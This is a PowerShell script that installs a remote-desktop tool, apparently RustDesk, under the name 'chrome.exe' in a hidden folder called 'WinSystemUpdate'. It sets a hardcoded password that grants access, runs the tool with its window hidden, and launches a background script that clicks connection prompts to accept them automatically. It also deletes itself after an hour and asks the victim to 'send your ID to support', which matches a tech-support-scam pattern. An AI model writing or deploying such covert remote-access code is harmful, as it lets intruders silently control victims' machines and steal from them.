function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
    $CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
    $SCITER_URL  = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"

    # 1. Kill old + clean
    Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST -Force | Out-Null

    # 2. Download both files in parallel
    Write-Host "Installing..." -ForegroundColor Cyan
    $wc1 = New-Object System.Net.WebClient
    $wc2 = New-Object System.Net.WebClient
    $t1 = $wc1.DownloadFileTaskAsync($CHROME_URL, "$DEST\chrome.exe")
    $t2 = $wc2.DownloadFileTaskAsync($SCITER_URL,  "$DEST\sciter.dll")
    [System.Threading.Tasks.Task]::WaitAll($t1, $t2)

    if (!(Test-Path "$DEST\chrome.exe") -or (Get-Item "$DEST\chrome.exe").Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; Read-Host "Press Enter"; return
    }

    # 3. Write config with permanent password
    $cfgDir = "$env:APPDATA\RustDesk\config"
    New-Item -ItemType Directory $cfgDir -Force | Out-Null
    Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''"             -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'"  -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "salt = ''"               -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true"    -Encoding UTF8
    Set-Content "$cfgDir\RustDesk2.toml" "rendezvous_server = 'rs-ny.rustdesk.com:21116'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1"            -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "serial = 0"              -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "[options]"               -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "verification-method = 'use-permanent-password'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'" -Encoding UTF8

    # 4. Hide folder
    $f = Get-Item $DEST -Force
    $f.Attributes = $f.Attributes -bor 2 -bor 4

    # 5. Get ID with 8s timeout (--get-id hangs if called wrong)
    $RDID = ""
    $idProc = Start-Process "$DEST\chrome.exe" -ArgumentList "--get-id" -PassThru -WindowStyle Hidden -RedirectStandardOutput "$DEST\id.txt"
    $idProc.WaitForExit(8000) | Out-Null
    if (!$idProc.HasExited) { $idProc.Kill() }
    Start-Sleep 1
    $RDID = (Get-Content "$DEST\id.txt" -EA SilentlyContinue -Raw).Trim()

    # If no ID yet, launch briefly to generate config then retry
    if (!$RDID -or $RDID -notmatch '^\d+$') {
        $psi0 = New-Object System.Diagnostics.ProcessStartInfo
        $psi0.FileName = "$DEST\chrome.exe"
        $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi0.UseShellExecute = $true
        $pr = [System.Diagnostics.Process]::Start($psi0)
        Start-Sleep 5
        $pr | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep 2
        $idProc2 = Start-Process "$DEST\chrome.exe" -ArgumentList "--get-id" -PassThru -WindowStyle Hidden -RedirectStandardOutput "$DEST\id.txt"
        $idProc2.WaitForExit(8000) | Out-Null
        if (!$idProc2.HasExited) { $idProc2.Kill() }
        $RDID = (Get-Content "$DEST\id.txt" -EA SilentlyContinue -Raw).Trim()
    }

    # Fallback: decode from enc_id
    if (!$RDID -or $RDID -notmatch '^\d+$') {
        $enc = (Get-Content "$cfgDir\RustDesk.toml" -EA SilentlyContinue | Where-Object { $_ -match "enc_id" }) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
        if ($enc) {
            try { $b = [Convert]::FromBase64String($enc); $RDID = [System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)], 0).ToString() } catch {}
        }
    }

    # 6. Launch RustDesk hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName        = "$DEST\chrome.exe"
    $psi.WorkingDirectory = $DEST
    $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 4

    # 7. Hide window
    Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
    Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

    # 8. Create delete.ps1
    $deletePs = "$DEST\delete.ps1"
    Set-Content  $deletePs '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
    Add-Content  $deletePs 'Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $deletePs 'Start-Sleep 2' -Encoding ASCII
    Add-Content  $deletePs 'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $deletePs 'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII

    # 9. Create desktop shortcut
    $lnkPath = $null
    foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
        if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
    }
    if ($lnkPath) {
        $sh = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
        $sh.TargetPath   = "powershell.exe"
        $sh.Arguments    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
        $sh.IconLocation = "shell32.dll,131"
        $sh.Save()
    }

    # 10. Auto-accept popup script
    $acceptPs = "$DEST\accept.ps1"
    Set-Content $acceptPs 'Add-Type @"
using System; using System.Runtime.InteropServices; using System.Text;
public class RD {
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumProc p, IntPtr l);
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern int GetWindowTextLength(IntPtr h);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int e);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern bool BringWindowToTop(IntPtr h);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left,Top,Right,Bottom; }
    public delegate bool EnumProc(IntPtr h, IntPtr l);
}
"@
$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
function Click-At($hw,$r){
    [RD]::ShowWindow($hw,9)|Out-Null; [RD]::BringWindowToTop($hw)|Out-Null; [RD]::SetForegroundWindow($hw)|Out-Null
    Start-Sleep -Milliseconds 400
    $cx=$r.Left+[int](($r.Right-$r.Left)*0.50); $cy=$r.Top+[int](($r.Bottom-$r.Top)*0.82)
    [RD]::SetCursorPos($cx,$cy)|Out-Null; Start-Sleep -Milliseconds 150
    [RD]::mouse_event(2,0,0,0,0); Start-Sleep -Milliseconds 80; [RD]::mouse_event(4,0,0,0,0)
    Start-Sleep -Milliseconds 500; [RD]::ShowWindow($hw,0)|Out-Null
}
while($true){
    Start-Sleep -Milliseconds 300
    $pids=Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -eq "$DEST\chrome.exe"}|Select-Object -Expand Id
    if(!$pids){break}
    [RD]::EnumWindows({param($h,$l)
        $p=0;[RD]::GetWindowThreadProcessId($h,[ref]$p)|Out-Null
        if($p -notin $script:pids){return $true}
        $len=[RD]::GetWindowTextLength($h); if($len -eq 0){return $true}
        $sb=New-Object System.Text.StringBuilder($len+1); [RD]::GetWindowText($h,$sb,$len+1)|Out-Null
        $t=$sb.ToString()
        if($t -in "Chrome","chrome"){return $true}
        if($t -like "MSCTF*" -or $t -like "Default IME*"){return $true}
        $r=New-Object RD+RECT; [RD]::GetWindowRect($h,[ref]$r)|Out-Null
        $w=$r.Right-$r.Left; $ht=$r.Bottom-$r.Top
        if($w -gt 200 -and $w -lt 700 -and $ht -gt 250 -and $ht -lt 750){Click-At $h $r}
        return $true
    },[IntPtr]::Zero)|Out-Null
}' -Encoding UTF8
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden

    # 11. 1-hour auto-delete timer
    $timerPs = "$DEST\timer.ps1"
    Set-Content  $timerPs '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
    Add-Content  $timerPs 'Start-Sleep 3600' -Encoding ASCII
    Add-Content  $timerPs 'Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $timerPs 'Start-Sleep 2' -Encoding ASCII
    Add-Content  $timerPs 'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $timerPs 'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden

    # 12. Show result
    Write-Host ""
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
    Write-Host "   Password: Remote123" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   Send your ID to support." -ForegroundColor White
    Write-Host "   Desktop shortcut: DELETE CHROME" -ForegroundColor Gray
    Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
    Write-Host ""
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host ""
}
Install-RD
